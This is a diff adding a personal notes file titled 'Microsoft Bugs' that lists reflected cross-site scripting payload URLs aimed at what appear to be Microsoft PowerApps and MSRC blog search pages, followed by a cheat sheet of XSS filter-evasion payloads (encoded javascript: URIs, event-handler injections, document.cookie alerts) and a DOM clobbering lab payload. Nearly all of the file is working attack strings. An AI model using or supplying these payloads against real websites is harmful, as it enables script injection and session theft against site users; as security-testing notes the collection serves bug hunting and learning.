@@ -1,0 +1,45 @@
+Microsoft Bugs
+=========================
+https://apps.powerapps.com/authflow/authframe?telemetryLocation=
+
+"<%2fscript><script>alert('xss')<%2fscript>
+"<%2fscript><script>alert(document.domain)<%2fscript>
+
+
+https://msrc.mirosoft.com/blog/search/?query=<img/src/onerror=alert(document['domain'])
+https://msrc.mirosoft.com/blog/search/?query=<img/src/onerror=alert(document['location'])
+https://msrc.mirosoft.com/blog/search/?query=%3Ch1%3E%3Ckarquee%3EThanks for watching ^_^%3Cbr%3E
+
+
+Cheatsheet
+------------------
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+
+Lab: Exploiting DOM clobbering to enable XSS
+=============================
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+
+
+
+
+
